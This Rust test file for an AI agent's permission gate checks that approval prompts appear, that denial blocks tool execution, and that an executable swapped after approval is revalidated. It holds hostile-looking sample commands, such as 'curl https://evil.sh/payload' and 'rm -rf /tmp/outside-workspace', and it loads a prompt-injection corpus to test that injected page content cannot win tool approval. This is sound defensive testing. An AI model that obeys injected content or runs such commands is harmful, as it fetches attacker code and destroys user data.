#![cfg(test)]

use crate::PermissionGate;
use crate::engine::MessageDisposition;
use crate::engine::builtin_hook_dispatcher;
use crate::engine::commands::builtin_command_registry;
use crate::engine::pending_event::PendingEvent;
use crate::engine::session::SessionActor;
use crate::engine::tests::fixtures::checkpoints::SingleFileCheckpoints;
use crate::engine::tests::fixtures::controllers::PreludePromptCommand;
use crate::engine::tests::fixtures::hooks::FixedHook;
use crate::engine::tests::fixtures::models::ScriptedModel;
use crate::engine::tests::fixtures::support::collect_turn;
use crate::engine::tests::fixtures::support::config;
use crate::engine::tests::fixtures::support::next_matching;
use crate::engine::tests::fixtures::support::stop_script;
use crate::engine::tests::fixtures::support::tool_script;
use crate::engine::tests::fixtures::tools::FileMutatingBash;
use crate::engine::tests::fixtures::tools::StubOutcome;
use crate::engine::tests::fixtures::tools::StubTool;
use rw_ext::CommandDescriptor;
use rw_ext::HookDirective;
use rw_ext::HookEvent;
use rw_ext::HookRegistration;
use rw_tools::ToolRegistry;
use rw_tools::ToolResult;
use rw_types::ApprovalDecision;
use rw_types::EngineEvent;
use rw_types::ToolCapability;
use rw_types::ToolOutput;
use rw_types::config::PermissionDecision;
use serde_json::Value;
use serde_json::json;
use std::sync::Arc;
use std::sync::Mutex;
use std::sync::atomic::Ordering;
use tempfile::TempDir;

#[tokio::test]
async fn ask_permission_allows_or_denies_without_bypassing_the_gate() {
    for (decision, expected_calls, expected_error) in [
        (ApprovalDecision::AllowOnce, 1, false),
        (ApprovalDecision::Deny, 0, true),
    ] {
        let root = TempDir::new().expect("tempdir");
        let model = Arc::new(ScriptedModel::new([
            tool_script(&[("call", "fixture", json!({"path": "a"}))], &[]),
            stop_script("done", &[]),
        ]));
        let tool = Arc::new(StubTool::new(
            "fixture",
            vec![ToolCapability::WriteFilesystem],
            StubOutcome::Success(ToolResult::new("ok", Value::Null)),
        ));
        let mut tools = ToolRegistry::new();
        tools.register(tool.clone()).expect("register tool");
        let handle = SessionActor::spawn(config(
            root.path(),
            model,
            Arc::new(tools),
            PermissionDecision::Ask,
            builtin_hook_dispatcher().expect("hooks"),
        ))
        .expect("actor");
        let mut events = handle.subscribe().expect("subscription");
        handle.send_message("run").await.expect("message");
        let request = next_matching(&mut events, |kind| {
            matches!(kind, PendingEvent::PermissionRequested { .. })
        })
        .await;
        let PendingEvent::PermissionRequested { request, .. } = request.kind else {
            unreachable!("matching event")
        };
        assert!(
            handle
                .approve(request.id, request.invocation_id.clone(), decision.clone())
                .await
                .expect("approval")
        );
        let finished = next_matching(&mut events, |kind| {
            matches!(kind, PendingEvent::ToolCallFinished { .. })
        })
        .await;
        assert!(matches!(
            finished.kind,
            PendingEvent::ToolCallFinished { is_error, .. }
                if is_error == expected_error
        ));
        next_matching(&mut events, |kind| {
            matches!(kind, PendingEvent::TurnFinished { .. })
        })
        .await;
        assert_eq!(tool.calls.load(Ordering::SeqCst), expected_calls);
    }
}

#[tokio::test]
async fn matching_hook_execute_capability_is_authorized_before_tool_or_hook_runs() {
    for (decision, expected_calls) in [
        (ApprovalDecision::Deny, 0),
        (ApprovalDecision::AllowOnce, 1),
    ] {
        let root = TempDir::new().expect("tempdir");
        let model = Arc::new(ScriptedModel::new([
            tool_script(
                &[("write-call", "write_fixture", json!({"path": "a"}))],
                &[],
            ),
            stop_script("done", &[]),
        ]));
        let tool = Arc::new(StubTool::new(
            "write_fixture",
            vec![ToolCapability::WriteFilesystem],
            StubOutcome::Success(ToolResult::new("ok", Value::Null)),
        ));
        let mut tools = ToolRegistry::new();
        tools.register(tool.clone()).expect("register tool");
        let hook_calls = Arc::new(Mutex::new(Vec::new()));
        let mut hooks = builtin_hook_dispatcher().expect("hooks");
        hooks
            .register(
                HookRegistration::new("fixture.execute-post", HookEvent::PostTool)
                    .with_applicable_tools(["write_fixture"])
                    .with_required_capabilities([ToolCapability::Execute]),
                FixedHook {
                    label: "execute-post",
                    calls: Arc::clone(&hook_calls),
                    result: Ok(HookDirective::Continue),
                },
            )
            .expect("hook");
        let handle = SessionActor::spawn(config(
            root.path(),
            model,
            Arc::new(tools),
            PermissionDecision::Ask,
            hooks,
        ))
        .expect("actor");
        let mut events = handle.subscribe().expect("subscription");
        handle.send_message("write").await.expect("message");
        let approval = next_matching(&mut events, |kind| {
            matches!(kind, PendingEvent::PermissionRequested { .. })
        })
        .await;
        let PendingEvent::PermissionRequested { request, .. } = approval.kind else {
            unreachable!("matching approval")
        };
        assert!(
            request
                .capabilities
                .contains(&ToolCapability::WriteFilesystem)
        );
        assert!(request.capabilities.contains(&ToolCapability::Execute));
        handle
            .approve(request.id, request.invocation_id.clone(), decision)
            .await
            .expect("approval");
        collect_turn(&mut events).await;
        assert_eq!(tool.calls.load(Ordering::SeqCst), expected_calls);
        assert_eq!(hook_calls.lock().expect("hook calls").len(), expected_calls);
    }
}

#[tokio::test]
async fn command_tool_prelude_uses_interactive_approval_and_denial_aborts_prompt() {
    for (decision, expected_calls, expected_model_requests) in [
        (ApprovalDecision::AllowOnce, 1, 1),
        (ApprovalDecision::Deny, 0, 0),
    ] {
        let root = TempDir::new().expect("tempdir");
        let model = Arc::new(ScriptedModel::new([stop_script("done", &[])]));
        let tool = Arc::new(
            StubTool::new(
                "bash",
                vec![ToolCapability::Execute, ToolCapability::WriteFilesystem],
                StubOutcome::Success(ToolResult::new("prelude output", Value::Null)),
            )
            .with_behavior(rw_tools::ToolBehavior::Shell),
        );
        let mut tools = ToolRegistry::new();
        tools.register(tool.clone()).expect("register bash");
        let mut commands = builtin_command_registry().expect("commands");
        commands
            .register(
                CommandDescriptor::new("prelude", "run typed command prelude"),
                PreludePromptCommand {
                    command: "fixture-shell".to_owned(),
                },
            )
            .expect("prelude command");
        let mut actor_config = config(
            root.path(),
            model.clone(),
            Arc::new(tools),
            PermissionDecision::Ask,
            builtin_hook_dispatcher().expect("hooks"),
        );
        actor_config.commands = Arc::new(commands);
        let handle = SessionActor::spawn(actor_config).expect("actor");
        let mut events = handle.subscribe().expect("subscription");
        assert_eq!(
            handle.send_message("/prelude").await.expect("command"),
            MessageDisposition::Started
        );
        let approval = next_matching(&mut events, |kind| {
            matches!(kind, PendingEvent::PermissionRequested { .. })
        })
        .await;
        let PendingEvent::PermissionRequested { request, .. } = approval.kind else {
            unreachable!("matching approval")
        };
        assert_eq!(request.tool_name, "bash");
        assert_eq!(request.arguments["command"], "fixture-shell");
        assert!(
            handle
                .approve(request.id, request.invocation_id.clone(), decision.clone())
                .await
                .expect("approval response")
        );
        let remaining = collect_turn(&mut events).await;
        assert_eq!(tool.calls.load(Ordering::SeqCst), expected_calls);
        assert_eq!(model.request_count(), expected_model_requests);
        if decision == ApprovalDecision::AllowOnce {
            let request = model.requests.lock().expect("requests");
            let encoded = serde_json::to_string(&request[0].turns).expect("turns");
            assert!(encoded.contains("ROTTWEILER_UNTRUSTED_DATA="));
            assert!(encoded.contains("prelude output"));
            assert!(remaining.iter().any(|event| matches!(
                event.kind,
                PendingEvent::ToolCallFinished {
                    is_error: false,
                    ..
                }
            )));
        } else {
            assert!(remaining.iter().any(|event| matches!(
                event.kind,
                PendingEvent::ToolCallFinished { is_error: true, .. }
            )));
        }
    }
}

#[tokio::test]
async fn mutating_command_prelude_is_byte_restored_by_rewind() {
    let root = TempDir::new().expect("tempdir");
    let mutated = root.path().join("prelude.txt");
    let model = Arc::new(ScriptedModel::new([
        stop_script("baseline", &[]),
        stop_script("after prelude", &[]),
    ]));
    let mut tools = ToolRegistry::new();
    tools
        .register(Arc::new(FileMutatingBash {
            path: mutated.clone(),
        }))
        .expect("register mutating bash");
    let mut commands = builtin_command_registry().expect("commands");
    commands
        .register(
            CommandDescriptor::new("prelude", "run typed command prelude"),
            PreludePromptCommand {
                command: "fixture-shell".to_owned(),
            },
        )
        .expect("prelude command");
    let checkpoints = Arc::new(SingleFileCheckpoints {
        path: mutated.clone(),
        snapshots: Mutex::new(Vec::new()),
    });
    let mut actor_config = config(
        root.path(),
        model,
        Arc::new(tools),
        PermissionDecision::Allow,
        builtin_hook_dispatcher().expect("hooks"),
    );
    actor_config.commands = Arc::new(commands);
    actor_config.checkpoints = checkpoints;
    let handle = SessionActor::spawn(actor_config).expect("actor");
    let mut events = handle.subscribe().expect("subscription");
    handle.send_message("baseline").await.expect("baseline");
    collect_turn(&mut events).await;
    handle.send_message("/prelude").await.expect("prelude");
    collect_turn(&mut events).await;
    assert_eq!(
        std::fs::read_to_string(&mutated).expect("mutated file"),
        "mutated by command prelude"
    );
    handle.send_message("/rewind 1").await.expect("rewind");
    assert!(!mutated.exists());
}

#[tokio::test]
async fn destructive_bash_default_ask_prompts_once_and_denial_never_executes() {
    let root = TempDir::new().expect("tempdir");
    let model = Arc::new(ScriptedModel::new([
        tool_script(
            &[(
                "destructive-call",
                "bash",
                json!({
                    "command": "rm -rf /tmp/outside-workspace",
                    "cwd": ".",
                    "env": {},
                    "network_domains": [],
                }),
            )],
            &[],
        ),
        stop_script("denied", &[]),
    ]));
    let tool = Arc::new(
        StubTool::new(
            "bash",
            vec![ToolCapability::Execute, ToolCapability::WriteFilesystem],
            StubOutcome::Success(ToolResult::new("must not execute", Value::Null)),
        )
        .with_behavior(rw_tools::ToolBehavior::Shell),
    );
    let mut tools = ToolRegistry::new();
    tools.register(tool.clone()).expect("register bash fixture");
    let handle = SessionActor::spawn(config(
        root.path(),
        model,
        Arc::new(tools),
        PermissionDecision::Ask,
        builtin_hook_dispatcher().expect("hooks"),
    ))
    .expect("actor");
    let mut events = handle.subscribe().expect("subscription");
    handle.send_message("delete it").await.expect("message");

    let approval = next_matching(&mut events, |kind| {
        matches!(kind, PendingEvent::PermissionRequested { .. })
    })
    .await;
    let PendingEvent::PermissionRequested { request, .. } = approval.kind else {
        unreachable!("matching event")
    };
    assert_eq!(request.tool_name, "bash");
    assert_eq!(
        request.arguments["command"],
        "rm -rf /tmp/outside-workspace"
    );
    assert!(
        handle
            .approve(
                request.id,
                request.invocation_id.clone(),
                ApprovalDecision::Deny
            )
            .await
            .expect("approval response")
    );

    let remaining = collect_turn(&mut events).await;
    assert!(remaining.iter().any(|event| matches!(
        event.kind,
        PendingEvent::ToolCallFinished { is_error: true, .. }
    )));
    assert_eq!(
        remaining
            .iter()
            .filter(|event| matches!(event.kind, PendingEvent::PermissionRequested { .. }))
            .count(),
        0,
        "the single destructive invocation must ask exactly once"
    );
    assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn unsandboxed_bash_denial_is_conspicuous_and_never_reaches_the_executor() {
    let root = TempDir::new().expect("tempdir");
    let model = Arc::new(ScriptedModel::new([
        tool_script(
            &[(
                "unsandboxed-call",
                "bash",
                json!({
                    "command": "/bin/echo escape",
                    "cwd": ".",
                    "env": {},
                    "network_domains": [],
                    "sandbox": "unsandboxed",
                }),
            )],
            &[],
        ),
        stop_script("denied", &[]),
    ]));
    let tool = Arc::new(
        StubTool::new(
            "bash",
            vec![ToolCapability::Execute, ToolCapability::WriteFilesystem],
            StubOutcome::Success(ToolResult::new("must not execute", Value::Null)),
        )
        .with_behavior(rw_tools::ToolBehavior::Shell),
    );
    let mut tools = ToolRegistry::new();
    tools.register(tool.clone()).expect("register bash fixture");
    let handle = SessionActor::spawn(config(
        root.path(),
        model,
        Arc::new(tools),
        PermissionDecision::Ask,
        builtin_hook_dispatcher().expect("hooks"),
    ))
    .expect("actor");
    let mut events = handle.subscribe().expect("subscription");
    handle.send_message("escape").await.expect("message");
    let approval = next_matching(&mut events, |kind| {
        matches!(kind, PendingEvent::PermissionRequested { .. })
    })
    .await;
    assert!(matches!(
        &approval.wire,
        EngineEvent::ToolApprovalNeeded { rationale, args, .. }
            if rationale.contains("UNSANDBOXED EXECUTION")
                && args["sandbox"] == "unsandboxed"
    ));
    let PendingEvent::PermissionRequested { request, .. } = approval.kind else {
        unreachable!("matching event")
    };
    assert!(
        handle
            .approve(
                request.id,
                request.invocation_id.clone(),
                ApprovalDecision::Deny
            )
            .await
            .expect("deny")
    );
    collect_turn(&mut events).await;
    assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn user_safe_list_cargo_test_fixture_runs_without_an_approval_event() {
    let root = TempDir::new().expect("tempdir");
    let model = Arc::new(ScriptedModel::new([
        tool_script(
            &[(
                "cargo-test-call",
                "bash",
                json!({
                    "command": "cargo test",
                    "cwd": ".",
                    "env": {},
                    "network_domains": [],
                    "sandbox": "sandboxed",
                }),
            )],
            &[],
        ),
        stop_script("done", &[]),
    ]));
    let tool = Arc::new(
        StubTool::new(
            "bash",
            vec![ToolCapability::Execute],
            StubOutcome::Success(ToolResult::new("tests passed", Value::Null)),
        )
        .with_behavior(rw_tools::ToolBehavior::Shell),
    );
    let mut tools = ToolRegistry::new();
    tools.register(tool.clone()).expect("register bash fixture");
    let mut actor_config = config(
        root.path(),
        model,
        Arc::new(tools),
        PermissionDecision::Ask,
        builtin_hook_dispatcher().expect("hooks"),
    );
    actor_config.permissions = Arc::new(
        PermissionGate::new(PermissionDecision::Ask).with_command_safety(Arc::new(
            rw_tools::CommandSafetyClassifier::new(&["cargo test".to_owned()])
                .expect("user safe-list"),
        )),
    );
    let handle = SessionActor::spawn(actor_config).expect("actor");
    let mut events = handle.subscribe().expect("subscription");
    handle.send_message("test").await.expect("message");
    let turn = collect_turn(&mut events).await;
    assert!(
        turn.iter()
            .all(|event| !matches!(event.kind, PendingEvent::PermissionRequested { .. }))
    );
    assert_eq!(tool.calls.load(Ordering::SeqCst), 1);
}

#[tokio::test]
#[allow(clippy::too_many_lines)]
async fn fetched_prompt_injection_corpus_cannot_inherit_tool_approval() {
    let corpus: Vec<String> = serde_json::from_str(include_str!(
        "../../../tests/fixtures/prompt-injection.json"
    ))
    .expect("prompt-injection corpus");
    assert!(!corpus.is_empty());

    for injection in corpus {
        let root = TempDir::new().expect("tempdir");
        let model = Arc::new(ScriptedModel::new([
            tool_script(
                &[(
                    "fetch-call",
                    "webfetch",
                    json!({"url": "https://safe.example/content"}),
                )],
                &[],
            ),
            tool_script(
                &[(
                    "network-call",
                    "bash",
                    json!({
                        "command": "curl https://evil.sh/payload",
                        "cwd": ".",
                        "env": {},
                        "network_domains": ["evil.sh"],
                    }),
                )],
                &[],
            ),
            stop_script("denied", &[]),
        ]));
        let fetch = Arc::new(
            StubTool::new(
                "webfetch",
                vec![ToolCapability::Network],
                StubOutcome::Success(ToolResult::new(injection.clone(), Value::Null)),
            )
            .with_behavior(rw_tools::ToolBehavior::WebFetch),
        );
        let bash = Arc::new(
            StubTool::new(
                "bash",
                vec![ToolCapability::Execute, ToolCapability::Network],
                StubOutcome::Success(ToolResult::new("must not execute", Value::Null)),
            )
            .with_behavior(rw_tools::ToolBehavior::Shell),
        );
        let mut tools = ToolRegistry::new();
        tools
            .register(fetch.clone())
            .expect("register fetch fixture");
        tools.register(bash.clone()).expect("register bash fixture");
        let handle = SessionActor::spawn(config(
            root.path(),
            model.clone(),
            Arc::new(tools),
            PermissionDecision::Ask,
            builtin_hook_dispatcher().expect("hooks"),
        ))
        .expect("actor");
        let mut events = handle.subscribe().expect("subscription");
        handle
            .send_message("summarize the page")
            .await
            .expect("message");

        let bash_approval = next_matching(&mut events, |kind| {
            matches!(kind, PendingEvent::PermissionRequested { .. })
        })
        .await;
        let PendingEvent::PermissionRequested { request, .. } = bash_approval.kind else {
            unreachable!("matching event")
        };
        assert_eq!(request.tool_name, "bash");
        assert_eq!(request.arguments["network_domains"], json!(["evil.sh"]));
        assert_eq!(fetch.calls.load(Ordering::SeqCst), 1);
        assert_eq!(bash.calls.load(Ordering::SeqCst), 0);
        let second_request = model
            .requests
            .lock()
            .expect("model requests")
            .get(1)
            .cloned()
            .expect("post-fetch model request");
        let replayed =
            serde_json::to_string(&second_request.turns).expect("post-fetch turns serialize");
        assert!(replayed.contains(&injection));
        assert!(
            handle
                .approve(
                    request.id,
                    request.invocation_id.clone(),
                    ApprovalDecision::Deny
                )
                .await
                .expect("bash denial")
        );
        let remaining = collect_turn(&mut events).await;
        assert!(
            remaining
                .iter()
                .all(|event| !matches!(event.kind, PendingEvent::PermissionRequested { .. }))
        );
        assert_eq!(bash.calls.load(Ordering::SeqCst), 0);
    }
}

#[cfg(unix)]
#[tokio::test]
async fn changed_bash_executable_is_revalidated_after_approval_before_tool_execution() {
    use std::os::unix::fs::PermissionsExt as _;

    let root = TempDir::new().expect("tempdir");
    let script = root.path().join("script");
    std::fs::write(&script, "#!/bin/sh\nprintf first\n").expect("script");
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).expect("executable");
    let model = Arc::new(ScriptedModel::new([
        tool_script(
            &[(
                "call",
                "bash",
                json!({
                    "command": "./script safe",
                    "cwd": root.path(),
                    "env": {},
                    "network_domains": [],
                }),
            )],
            &[],
        ),
        stop_script("done", &[]),
    ]));
    let tool = Arc::new(
        StubTool::new(
            "bash",
            vec![ToolCapability::Execute],
            StubOutcome::Success(ToolResult::new("should not execute", Value::Null)),
        )
        .with_behavior(rw_tools::ToolBehavior::Shell),
    );
    let mut tools = ToolRegistry::new();
    tools.register(tool.clone()).expect("register bash fixture");
    let handle = SessionActor::spawn(config(
        root.path(),
        model,
        Arc::new(tools),
        PermissionDecision::Ask,
        builtin_hook_dispatcher().expect("hooks"),
    ))
    .expect("actor");
    let mut events = handle.subscribe().expect("subscription");
    handle.send_message("run").await.expect("message");
    let event = next_matching(&mut events, |kind| {
        matches!(kind, PendingEvent::PermissionRequested { .. })
    })
    .await;
    let PendingEvent::PermissionRequested { request, .. } = event.kind else {
        unreachable!("matching event")
    };
    std::fs::write(&script, "#!/bin/sh\nprintf replaced\n").expect("replace executable");
    assert!(
        handle
            .approve(
                request.id,
                request.invocation_id.clone(),
                ApprovalDecision::AllowOnce
            )
            .await
            .expect("approval")
    );
    let finished = next_matching(&mut events, |kind| {
        matches!(kind, PendingEvent::ToolCallFinished { .. })
    })
    .await;
    assert!(matches!(
        finished.kind,
        PendingEvent::ToolCallFinished {
            is_error: true,
            output: ToolOutput::Text { text },
            ..
        } if text.contains("invocation identity changed")
    ));
    assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
}

#[cfg(unix)]
#[tokio::test]
async fn unrememberable_project_approval_executes_the_displayed_bash_once() {
    use std::os::unix::fs::PermissionsExt as _;

    let root = TempDir::new().expect("tempdir");
    let script = root.path().join("script");
    std::fs::write(&script, "#!/bin/sh\nprintf mutable\n").expect("script");
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).expect("executable");
    let model = Arc::new(ScriptedModel::new([
        tool_script(
            &[(
                "call",
                "bash",
                json!({
                    "command": "./script safe",
                    "cwd": root.path(),
                    "env": {},
                    "network_domains": [],
                }),
            )],
            &[],
        ),
        stop_script("done", &[]),
    ]));
    let tool = Arc::new(
        StubTool::new(
            "bash",
            vec![ToolCapability::Execute],
            StubOutcome::Success(ToolResult::new("executed once", Value::Null)),
        )
        .with_behavior(rw_tools::ToolBehavior::Shell),
    );
    let mut tools = ToolRegistry::new();
    tools.register(tool.clone()).expect("register bash fixture");
    let handle = SessionActor::spawn(config(
        root.path(),
        model,
        Arc::new(tools),
        PermissionDecision::Ask,
        builtin_hook_dispatcher().expect("hooks"),
    ))
    .expect("actor");
    let mut events = handle.subscribe().expect("subscription");
    handle.send_message("run").await.expect("message");
    let event = next_matching(&mut events, |kind| {
        matches!(kind, PendingEvent::PermissionRequested { .. })
    })
    .await;
    let PendingEvent::PermissionRequested { request, .. } = event.kind else {
        unreachable!("matching event")
    };
    assert!(
        handle
            .approve(
                request.id,
                request.invocation_id.clone(),
                ApprovalDecision::AllowProject
            )
            .await
            .expect("approval response")
    );
    let finished = next_matching(&mut events, |kind| {
        matches!(kind, PendingEvent::ToolCallFinished { .. })
    })
    .await;
    assert!(matches!(
        finished.kind,
        PendingEvent::ToolCallFinished {
            is_error: false,
            output: ToolOutput::Text { text },
            ..
        } if text.contains("executed once")
    ));
    assert_eq!(tool.calls.load(Ordering::SeqCst), 1);
}
